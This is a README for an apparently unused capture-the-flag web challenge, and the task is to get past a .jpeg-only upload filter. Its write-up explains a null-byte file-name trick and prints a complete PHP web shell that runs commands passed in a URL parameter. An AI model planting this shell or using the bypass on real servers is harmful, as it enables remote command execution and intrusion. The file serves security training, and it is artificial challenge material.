# File Upload (UNUSED)

To make this challenge active, the 0s at the end of the directory names must be removed.

## Description

This site only accepts .jpeg files as uploads... or does it? Find a way to upload a different file type and hack into the server's filesystem to find the flag!

Category: Intermediate

## Hint

What character usually indicates the end of a string? Remember: file names are just strings!

## Flag

not that far...

## Write-Up

Will update as challenge progresses...
Using burp suite, intercept the request for upload of file foo.phpA.jpeg - change the A to a null char and the upload will work. You can put in a php file such as

	<?php
	$c = $_GET['c'];
	$output = shell_exec($c);
	echo "<pre>$output</pre>";
	?>
	
and gain access to the shell.